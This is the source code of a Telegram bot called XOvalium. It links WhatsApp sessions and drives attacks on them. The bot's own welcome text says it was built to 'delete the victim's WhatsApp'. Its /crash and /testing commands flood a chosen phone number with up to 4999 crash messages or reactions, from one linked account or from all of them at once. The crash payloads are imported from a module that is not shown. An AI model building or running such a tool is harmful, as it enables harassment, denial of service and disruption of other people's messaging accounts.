import { connectbot } from "./config/auth.js";
import { connectToWhatsApp, sessions } from "./plugins/baileys.js";
import pino from "pino";
import figlet from "figlet";
import axios from "axios";
import fsExtra from "fs-extra";
import path from 'path';
import chalk from "chalk";
import { resolve } from "dns";
import { text } from "stream/consumers";

const startTime = Date.now;
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const bot = connectbot();

// Handle polling errors to prevent crash
bot.on('polling_error', (error) => {
    console.error(`[Polling Error] ${error.code}: ${error.message}`);
});


import { CrashUI, TestPing, TestReaction } from "./plugins/testFunc.js";
import { match } from "assert";

const vipFile = path.join(process.cwd(), 'data', 'vip_users.json');

// Helper to read/write VIPs
async function getVips() {
    try {
        return await fsExtra.readJson(vipFile);
    } catch {
        return [];
    }
}

async function addVip(number, name) {
    const vips = await getVips();
    if (!vips.find(v => v.number === number)) {
        vips.push({ number, name, addedAt: new Date().toISOString() });
        await fsExtra.writeJson(vipFile, vips, { spaces: 2 });
    }
}

async function removeVip(number) {
    let vips = await getVips();
    vips = vips.filter(v => v.number !== number);
    await fsExtra.writeJson(vipFile, vips, { spaces: 2 });
}


bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userName = msg.from.username;

    await bot.sendVideo(chatId, "https://files.catbox.moe/bf2a8i.mp4", {
        caption: `
\`\`\`死的─999“XOʋαʅιυɱ𐂡───────\`\`\`
 (🧩) — Hola, @${userName}!!
 Ce script a été créé pour supprimer WhatsApp de la victime à l'aide d'un code source ouvert, il s'appelle XOvalium!

\`\`\`
• 名前: XOʋαʅιυɱ
• バージョン: 1.0.0
• 言語: Indonesia
• コードネーム: HEN
\`\`\``,
parse_mode: "Markdown",
reply_markup: {
    inline_keyboard: [
        [{ text: "Settings", callback_data: "settings" }],
        [
            { text: "Crash Menu", callback_data: "crash_menu" },
            { text: "Source code", url: "https://github.com/Notzeyyyc/XOvalium" }
        ]
    ]
}
    });
});




bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const data = query.data;
    const username = query.from.username || query.from.first_name;

    if (data === 'settings') {
        const settingsCaption = `
\`\`\`
🚀 XOVALIUM SETTINGS
━━━━━━━━━━━━━━━━
Kelola fitur WhatsApp Anda lebih mudah!

[🔥] Featured Tools:
├ 📊 Realtime Analytics
├ 🔗 WA Device Manager
├ ⚡ Broadcast Blaster
└ 🤖 Auto-Reply Config

Status: 🟢 Online
\`\`\``;
        
        await bot.editMessageCaption(settingsCaption, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔄 Restart Session", callback_data: "restart_session" }],
                    [{ text: "🔙 Back to Main", callback_data: "back" }]
                ]
            }
        });
    } 
    
    if (data === 'back') {
        const mainCaption = `
\`\`\`死的─999“XOʋαʅιυɱ𐂡───────\`\`\`
 (🧩) — Hola, @${username}!!
 Ce script a été créé pour supprimer WhatsApp de la victime à l'aide d'un code source ouvert, il s'appelle XOvalium!

\`\`\`
• 名前: XOʋαʅιυɱ
• バージョン: 1.0.0
• 言語: Indonesia
• コードネーム: HEN
\`\`\``;

        await bot.editMessageCaption(mainCaption, {
             chat_id: chatId,
             message_id: messageId,
             parse_mode: "Markdown",
             reply_markup: {
                inline_keyboard: [
                    [{ text: "Settings", callback_data: "settings" }],
                    [
                        { text: "Crash Menu", callback_data: "crash_menu" },
                        { text: "Source code", url: "https://github.com/Notzeyyyc/XOvalium" }
                    ]
                ]
            }
        });
    }

    if (data === "crash_menu") {
        const crashMenuCaption = `
  \`\`\`死的─999“XOʋαʅιυɱ𐂡───────\`\`\`
 (🧩) — Hola, @${username}!!
 Ce script a été créé pour supprimer WhatsApp de la victime à l'aide d'un code source ouvert, il s'appelle XOvalium!

 \`\`\`
 /crash <number>
 \`\`\``;

        await bot.editMessageCaption(crashMenuCaption, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Back to main", callback_data: "back" }]
                ]
            }
        })
    }

    bot.answerCallbackQuery(query.id);
});

bot.onText(/\/connect(?: (.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const rawArgs = match[1] ? match[1].trim().split(/\s+/) : [];
    
    let phoneNumber = null;
    let sessionName = 'default';

    if (rawArgs.length > 0) {
        if (/^\d{8,15}$/.test(rawArgs[0])) {
             phoneNumber = rawArgs[0];
             if (rawArgs.length > 1) {
                 sessionName = rawArgs[1];
             }
        } else {
            sessionName = rawArgs[0];
        }
    }

    if (phoneNumber) {
        bot.sendMessage(chatId, `🔄 Menginisialisasi Pairing Code untuk nomor: ${phoneNumber} (Sesi: ${sessionName})...`);
    } else {
        bot.sendMessage(chatId, `🔄 Menginisialisasi QR Code untuk Sesi: ${sessionName}...`);
    }

    try {
        await connectToWhatsApp(bot, chatId, phoneNumber, sessionName);
    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, `Gagal memulai koneksi WhatsApp untuk sesi ${sessionName}.`);
    }
});

bot.onText(/\/sessions/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (sessions.size === 0) {
        return bot.sendMessage(chatId, "⚠️ Belum ada sesi WhatsApp yang aktif.");
    }

    let message = "📋 *Daftar Sesi Aktif:*\n";
    sessions.forEach((sock, name) => {
        const user = sock.user ? sock.user.id.split(':')[0] : 'Connecting...';
        message += `- *${name}*: ${user}\n`;
    });

    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

bot.onText(/\/logout (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const sessionName = match[1].trim();

    if (sessions.has(sessionName)) {
        try {
            const sock = sessions.get(sessionName);
            await sock.logout();
            sessions.delete(sessionName);
            bot.sendMessage(chatId, `✅ Sesi *${sessionName}* berhasil diputus (Logout).`, { parse_mode: 'Markdown' });
        } catch (err) {
            console.error(err);
            bot.sendMessage(chatId, `❌ Gagal logout sesi ${sessionName}.`);
        }
    } else {
        bot.sendMessage(chatId, `⚠️ Sesi *${sessionName}* tidak ditemukan.`, { parse_mode: 'Markdown' });
    }
});

bot.onText(/\/crash(?: (.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const rawArgs = match[1] ? match[1].trim().split(/\s+/) : [];
    
    if (rawArgs.length === 0) {
        return bot.sendMessage(chatId, "⚠️ Usage: /crash <target> [amount] [mode]\n\nMode:\n1: Single Session (Default)\n2: Multi Session (All Active Sessions)");
    }

    const target = rawArgs[0];
    let amount = 1;
    let mode = 1;

    // Parse args: target amount mode
    if (rawArgs.length > 1) {
        if (/^\d+$/.test(rawArgs[1])) amount = parseInt(rawArgs[1]);
        if (rawArgs.length > 2 && /^\d+$/.test(rawArgs[2])) mode = parseInt(rawArgs[2]);
    }

    if (amount > 4999) {
        return bot.sendMessage(chatId, "⚠️ Demi keamanan, batas maksimal spam adalah 4999 pesan.");
    }

    const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    if (mode === 2) {
        // Multi-Session Mode
        if (sessions.size === 0) {
            return bot.sendMessage(chatId, "⚠️ Tidak ada sesi WhatsApp yang aktif untuk Multi-Session.");
        }
        
        bot.sendMessage(chatId, `🚀 Memulai serangan Multi-Session ke ${target} menggunakan ${sessions.size} sesi aktif...`);
        
        let successCount = 0;
        sessions.forEach((sock, name) => {
            // Run async without awaiting loop completion to avoid blocking bot
            (async () => {
                try {
                    for (let i = 0; i < amount; i++) {
                        await TestPing(sock, jid);
                        if (i < amount - 1) await delay(1500); 
                    }
                    successCount++;
                } catch (err) {
                    console.error(`Error in session ${name}:`, err.message);
                }
            })();
        });

        bot.sendMessage(chatId, `✅ Perintah serangan dikirim ke seluruh sesi (${sessions.size} sesi).`);

    } else {
        // Single Session Mode (Auto-select)
        let sock = sessions.get('default');
        let sessionName = 'default';

        // Fallback if 'default' doesn't exist, pick the first available
        if (!sock) {
            if (sessions.size > 0) {
                const firstEntry = sessions.entries().next().value;
                sessionName = firstEntry[0];
                sock = firstEntry[1];
            } else {
                return bot.sendMessage(chatId, "⚠️ Tidak ada sesi WhatsApp yang aktif.");
            }
        }

        bot.sendMessage(chatId, `🚀 Mengirim ${amount} crash messages ke ${target} via sesi '${sessionName}'...`);

        let i = 0;
        try {
            for (i = 0; i < amount; i++) {
                await TestPing(sock, jid);
                if (i < amount - 1) await delay(1500); 
            }
            bot.sendMessage(chatId, `✅ Berhasil mengirim ${amount} crash messages ke ${target}!`);
        } catch (err) {
            console.error(err);
            bot.sendMessage(chatId, `❌ Gagal saat mengirim crash (sent: ${i}/${amount}): ${err.message}`);
        }
    }
});


bot.onText(/\/testing(?: (.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const rawArgs = match[1] ? match[1].trim().split(/\s+/) : [];

    if (rawArgs.length === 0) {
        return bot.sendMessage(chatId, "Usage: /testing <target> [amount] [mode]\n\nMode:\n1: Single Session (Default)\n2: Multi Session (All Active Sessions)");
    }
    
    const target = rawArgs[0];
    let amount = 1;
    let mode = 1;

    // Parse args: target amount mode
    if (rawArgs.length > 1) {
        if (/^\d+$/.test(rawArgs[1])) amount = parseInt(rawArgs[1]);
        if (rawArgs.length > 2 && /^\d+$/.test(rawArgs[2])) mode = parseInt(rawArgs[2]);
    }

    if (amount > 4999) {
        return bot.sendMessage(chatId, "⚠️ Demi keamanan, batas maksimal spam adalah 4999 pesan.");
    }

    const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    if (mode === 2) {
        // Multi-Session Mode
        if (sessions.size === 0) {
            return bot.sendMessage(chatId, "⚠️ Tidak ada sesi WhatsApp yang aktif untuk Multi-Session.");
        }
        
        bot.sendMessage(chatId, `🚀 Memulai serangan Testing (Reaction) Multi-Session ke ${target} menggunakan ${sessions.size} sesi aktif...`);
        
        let successCount = 0;
        sessions.forEach((sock, name) => {
            // Run async without awaiting loop completion to avoid blocking bot
            (async () => {
                try {
                    for (let i = 0; i < amount; i++) {
                        await TestReaction(sock, jid);
                        if (i < amount - 1) await delay(1500); 
                    }
                    successCount++;
                } catch (err) {
                    console.error(`Error in session ${name}:`, err.message);
                }
            })();
        });

        bot.sendMessage(chatId, `✅ Perintah Testing dikirim ke seluruh sesi (${sessions.size} sesi).`);

    } else {
        // Single Session Mode (Auto-select)
        let sock = sessions.get('default');
        let sessionName = 'default';

        // Fallback if 'default' doesn't exist, pick the first available
        if (!sock) {
            if (sessions.size > 0) {
                const firstEntry = sessions.entries().next().value;
                sessionName = firstEntry[0];
                sock = firstEntry[1];
            } else {
                return bot.sendMessage(chatId, "⚠️ Tidak ada sesi WhatsApp yang aktif.");
            }
        }

        bot.sendMessage(chatId, `🚀 Mengirim ${amount} testing (reaction) ke ${target} via sesi '${sessionName}'...`);

        let i = 0;
        try {
            for (i = 0; i < amount; i++) {
                await TestReaction(sock, jid);
                if (i < amount - 1) await delay(1500);
            }
            bot.sendMessage(chatId, `✅ Succesfully sending ${amount} testing function to ${target} via ${sessionName}`);
        } catch (err) {
            console.error(err);
            bot.sendMessage(chatId, `❌ Failed to send testing function to ${target} via ${sessionName}`);
        }
    }
});